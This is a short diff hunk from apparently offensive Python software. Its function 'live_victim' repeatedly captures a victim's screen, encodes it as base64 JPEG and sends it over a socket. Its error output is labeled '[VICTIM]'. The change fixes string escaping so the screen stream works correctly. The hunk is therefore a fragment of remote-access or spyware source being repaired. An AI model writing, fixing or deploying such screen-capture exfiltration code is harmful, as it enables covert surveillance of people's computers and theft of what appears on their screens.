@@ -57,7 +57,7 @@ def live_victim(client_socket):
             b = io.BytesIO()
             ss.save(b, format="JPEG", quality=30)
             b64 = base64.b64encode(b.getvalue()).decode()
-            client_socket.send(f"LIVE_START\\n{{b64}}\\nLIVE_END".encode())
+            client_socket.send(f"LIVE_START\n{b64}\nLIVE_END".encode())
             time.sleep(0.3)
     except Exception as e:
         print(f"[VICTIM] Screen streaming error: {e}")
